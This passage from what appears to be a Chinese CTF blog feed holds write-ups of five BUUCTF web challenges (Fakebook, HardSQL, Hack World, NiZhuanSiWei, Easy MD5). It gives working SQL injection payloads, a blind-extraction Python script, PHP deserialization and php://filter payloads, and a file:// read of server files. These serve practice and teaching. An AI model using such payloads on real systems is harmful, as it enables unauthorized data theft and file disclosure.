    <content type="html"><![CDATA[<h2 id="二十二、"><a href="#二十二、" class="headerlink" title="二十二、"></a>二十二、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[网鼎杯 2018]Fakebook<br><img src="https://ftp.bmp.ovh/imgs/2021/02/60fda5da538b4fed.png"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>转了一圈没发现什么信息，先join注册一个看看吧<br>注册后发现自己的用户名可以点<br>点进去<img src="https://ftp.bmp.ovh/imgs/2021/02/e439ef5ab0af2a57.png"><br>url中有<code>?no=1</code>加上个单引号—–报错<br>可以注入<code>?no=2/2</code>返回原来的界面—判断是数字型注入<br>经测试，union和select连在一起被过滤，可以<code>union/**/select</code>绕过<br><code>?no=2 union/**/select 1,2,3,4%23</code>看回显位<br><img src="https://ftp.bmp.ovh/imgs/2021/02/83843e2428edd86c.png"><br>可以看到是<code>2</code>位，接下来在<code>2</code>位上做文章<br><code>?no=2 union/**/select 1,(select database()),3,4%23</code>看库名——-<code>fakebook</code><br><code>?no=2 union/**/select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;fakebook&#39;),3,4%23</code>表名——<code>users</code><br><code>?no=2 union/**/select 1,(select group_concat(column_name)from information_schema。columss where table_name=&#39;users&#39;),3,4%23</code>列名 <img src="https://ftp.bmp.ovh/imgs/2021/02/ba2c9bb3cf8aa2b0.png"><br>有个data<img src="https://ftp.bmp.ovh/imgs/2021/02/e5ac564e3185f08b.png"><br>是一串序列化后的字节流<br>在robots.txt中发现<code>/user.php.bak</code>,得到一个文件，是源码</p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span><span class="token comment">//创建一个新的curl资源</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>设置url和相应的选项        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//如果CURLOPT_RETURNTRANSFER作为一个选项被设置到一个具体的句柄，那么这个函数将会以字符串的形式返回那个cURL句柄获取的内容。</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//抓取url并把它传递给浏览器</span>        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//关闭curl资源，并且释放系统资源</span>        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> getBlogContents <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> isValidBlog <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>        </span></code></pre></code></pre><p>大致意思就是get函数链接blog的url，将url返回的数据输出到页面上<br>curl是支持file协议的，而且sql注入的时候也得到了路径<br>本题还有个flag.php，wp说御剑能扫出来，但我扫不出来<br>data中是以序列化存储信息的，查询时要先反序列化，然后得到url<br>如果让它查询返回的包含<code>file:///var/www/html/flag.php</code>就可以得到flag<br>构造序列化字符串   </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"file:///var/www/html/flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>        </code></pre></code></pre><p><code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code>          </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?no=2 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;%23</code><br>源码中得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/02/d8a4939109cd9d6b.png"></p><h3 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h3><p>sql注入可以用报错注入      </p><hr><p>MySQL的load_file函数</p><blockquote><p><code>LOAD_FILE(file_name) </code><br> 其中file_name是文件的完整路径。</p></blockquote><p>payload:<code>?no=100 union/**/select 1,load_file(&#39;/var/www/html/flag.php&#39;),3,4 #</code>       </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>curl<img src="https://ftp.bmp.ovh/imgs/2021/02/b43bf24ea303eb35.png"><br><a href="https://blog.csdn.net/TM_1024/article/details/107045217?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161250725916780299095581%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161250725916780299095581&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-5-107045217.pc_search_result_no_baidu_js&utm_term=%255B%25E7%25BD%2591%25E9%25BC%258E%25E6%259D%25AF+2018%255DFakebook">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题021</title>
    <link href="/2021/02/04/BUU021/"/>
    <url>/2021/02/04/BUU021/</url>
    
    <content type="html"><![CDATA[<h2 id="二十一、"><a href="#二十一、" class="headerlink" title="二十一、"></a>二十一、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[极客大挑战 2019]HardSQL<br><img src="https://ftp.bmp.ovh/imgs/2021/02/a691058ea35deb23.png">     </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>1&#39;</code>报错<br><code>1&#39;#</code>没有报错<br>应该是单引号吧<br><code>1&#39; order by 1#</code><br><img src="https://ftp.bmp.ovh/imgs/2021/02/bb1b936889bdfec4.png"><br>又是过滤select、or、and、空格、=…….<br>又过滤了好多<br>1^1正常，<code>^</code>没有被过<br>看wp说用报错注入<code>extractvalue</code>或者<code>updatexml</code><br><code>空格</code>用括号<br><code>=</code>可以用<code>like</code>代替         </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>0x7e=’~’<br><code>1%27^extractvalue(1,concat(0x7e,(select(database())),0x7e))%23</code>获取当前库 <img src="https://ftp.bmp.ovh/imgs/2021/02/03a9b87ac4eb570b.png"><br><code>1%27^extractvalue(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e))%23</code>获取表   <img src="https://ftp.bmp.ovh/imgs/2021/02/57ffbf2ef4fe4254.png"><br><code>1%27^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e))%23</code>列  <img src="https://ftp.bmp.ovh/imgs/2021/02/83d7e8bc9bed4cec.png"><br><code>1%27^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e))%23</code>password<img src="https://ftp.bmp.ovh/imgs/2021/02/0133a6c9f86e4091.png"><br>可以看到只有一部分<br>可以利用<code>right()</code>函数获取剩余部分<br><code>1%27^extractvalue(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e))%23 </code><br><img src="https://ftp.bmp.ovh/imgs/2021/02/8f2b93bb89cadc01.png">     </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li><p><code>right()</code>函数       </p><blockquote><p>right(s,n):返回字符串s的后n位<br>left(s,n):返回字符串s的前n位          </p></blockquote></li><li><p>extractvalue函数        </p><blockquote><p>语法：<code>extractvalue(xml_document,Xpath_string)</code><br>第一个参数：xml_document是string格式<br>第二个参数：Xpath_string是xpath格式的字符串<br>作用：从目标xml中返回包含所查询的字符串<br>利用：如果第二个参数不满足要求，则会报错，并且将查询结果放在报错信息中<br>payload：<code>id=&#39;and(select extractvalue(1,concat(&#39;~&#39;,(sql语句))))</code><br>‘~’也可以换成’#’、’$’等不满足xpath格式的字符<br>extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位             </p></blockquote></li><li><p>updatexml函数         </p><blockquote><p>语法：<code>updatexml(xml_document,xpath_string,new_value)</code><br>第一个参数：xml_document是string格式，为xml文档对象的名称<br>第二个参数：xpath_string是xpath格式的字符串<br>第三个参数：new_value是string格式，替换查找到的负荷条件的数据<br>作用：改变文档中符合条件的节点的值<br>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同<br>payload：<code>1&#39;or(updatexml(1,concat(&#39;~&#39;,(sql语句)),1))%23</code>      </p></blockquote></li></ul><p><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">十种MySQL报错注入</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题020</title>
    <link href="/2021/02/03/BUU020/"/>
    <url>/2021/02/03/BUU020/</url>
    
    <content type="html"><![CDATA[<h2 id="二十、"><a href="#二十、" class="headerlink" title="二十、"></a>二十、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[CISCN2019 华北赛区 Day2 Web1]Hack World<img src="https://ftp.bmp.ovh/imgs/2021/02/89cf401b467058ca.png">       </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>输入与回显      </p><pre><code>0         Error Occured When Fetch Result.           1           Hello, glzjin wants a girlfriend.           2            Do you want to be my girlfriend?          3     Error Occured When Fetch Result.  1&#39; or 1=1#     SQL Injection Checked.      </code></pre><p>应该是有过滤的，burp看看<img src="https://ftp.bmp.ovh/imgs/2021/02/3880c49a96ccc108.png"><br>482的都被过滤了<br><code>union、select、空格、#、+、-。。。。。  </code><br>同时也可以看到ascii和substr没有被过，<br>输入2/2可以判断是数字型<br>空格可以用<code>()</code>绕过<br>或者异或<code>1^</code><br>payload:<code>1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))</code> </p><p>别人wp里看到的题目源码         </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$dbuser</span><span class="token operator">=</span><span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span><span class="token operator">=</span><span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token shell-comment comment">#被过滤的内容 函数基本没过滤</span>    <span class="token variable">$blackList</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">' '</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'||'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'#'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'-'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">';'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'&amp;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'+'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'or'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'and'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'`'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'"'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'insert'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'group'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'limit'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'update'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'delete'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'into'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'union'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'load_file'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'outfile'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$blackList</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$blackitem</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">False</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean constant">True</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">,</span><span class="token variable">$dbuser</span><span class="token punctuation">,</span><span class="token variable">$dbpass</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ctf"</span><span class="token punctuation">,</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Error Occured When Fetch Result."</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SQL Injection Checked."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>         </span></code></pre></code></pre><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><pre><code><pre class="language-php" data-language="php"><code class="language-php">import requestsimport base64import sysimport stringimport hashlibimport ioimport timesys<span class="token punctuation">.</span>stdout <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">TextIOWrapper</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>buffer<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token single-quoted-string string">'utf-8'</span><span class="token punctuation">)</span><span class="token shell-comment comment">#改变标准输出的默认编码,否则s.text不能输出</span>x <span class="token operator">=</span> string<span class="token punctuation">.</span>printableflag <span class="token operator">=</span> <span class="token double-quoted-string string">""</span>url <span class="token operator">=</span> <span class="token double-quoted-string string">"http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php"</span>payload<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token double-quoted-string string">"id"</span> <span class="token punctuation">:</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j in x<span class="token punctuation">:</span>payload<span class="token punctuation">[</span><span class="token double-quoted-string string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token function">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token shell-comment comment">#print(s.text)</span><span class="token keyword">if</span> <span class="token double-quoted-string string">"Hello"</span> in s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>flag <span class="token operator">+</span><span class="token operator">=</span> j<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>           </code></pre></code></pre><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>空格绕过</strong>    </p><ol><li>用括号将任何可以计算结果的语句括起来        </li><li>异或<br> 1^1=0<br> 0^0=0<br> 1^0=1          </li></ol><hr><p>想着用if构造payload：<code>if(ascii(substr((select(flag)from(flag)),1,1))&gt;127)</code>但运行出来都是些方框框               </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题019</title>
    <link href="/2021/02/02/BUU019/"/>
    <url>/2021/02/02/BUU019/</url>
    
    <content type="html"><![CDATA[<h2 id="十九、"><a href="#十九、" class="headerlink" title="十九、"></a>十九、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[ZJCTF 2019]NiZhuanSiWei<br><img src="https://ftp.bmp.ovh/imgs/2021/02/6451d712fe5dcc0a.png">      </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>传一个<code>$text</code>要其等于<code>welcome to the zjctf</code>这里用的<code>file_get_contents函数</code><br>可以用<code>data://text/plain;base64,</code>伪协议传入<br>下面file中过滤了flag，看来不能用<code>php://filter</code>伪协议读取<code>flag.php</code>了，但可以读取<code>useless.php</code>看看有什么<br>payload：<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">&#123;</span>  <span class="token comment">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token delimiter important">?></span></span>      </code></pre></code></pre><p><code>__tostring</code>方法当对象被当作字符串echo是自动执行<br>所以可以利用上面的password得到flag<br>先序列化        </p><pre><code>```php&lt;?php  class Flag&#123;  //flag.php      public $file=&#39;flag.php&#39;;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        &#125;      &#125;  &#125; $a=new Flag();echo serialize($a); ?&gt;       ```      </code></pre><p>运行结果<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>        </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code><br>源码中得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/02/16051bee3a20c7e8.png">      </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题018</title>
    <link href="/2021/02/01/BUU018/"/>
    <url>/2021/02/01/BUU018/</url>
    
    <content type="html"><![CDATA[<h2 id="十八、"><a href="#十八、" class="headerlink" title="十八、"></a>十八、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[BJDCTF2020]Easy MD5<br><img src="https://ftp.bmp.ovh/imgs/2021/02/a09e4e215d6be9b9.png"> </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>无论提交什么都没有什么回应<br>响应头里发现个hint<img src="https://ftp.bmp.ovh/imgs/2021/02/85ff7f61e127f882.png"><br>提交的参数会经过md5函数，true的意思是返回16位原始二进制格式的字符串<img src="https://ftp.bmp.ovh/imgs/2021/02/44eeb75c3480556f.png"><br>对于一个字符串，MD5默认时返回32位的16进制的字符串，有true后，32位每两位对应的十进制对应的ASCII码中的字符<br>比如：<code>ffifdyop</code>MD5后是<code>276f722736c95d99e921722cf9ed621c</code>,27对应十进制的39，39在ASCII码表中是<code>&#39;</code>单引号；所以上面的经过<code>md5($pass,true)</code>后是<code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code>带入到sql语句中就是<code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code>就永真了<br>输入<code>ffifdyop</code>查询<img src="https://ftp.bmp.ovh/imgs/2021/02/099cb5b53d346299.png"><br>可以数组绕过         </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p><code>a[]=1&amp;b[]=2</code><img src="https://ftp.bmp.ovh/imgs/2021/02/2ac547d4b6ae0d1d.png"><br>访问<code>levell14.php</code><img src="https://ftp.bmp.ovh/imgs/2021/02/4ff741a8ea4d3ca8.png">        </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><code>select * from &#39;admin&#39; where password=md5($pass,true)</code>绕过——–<code>ffifdyop</code><br>php弱类型比较<br><code>0exxx</code><br><code>数组</code>        </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
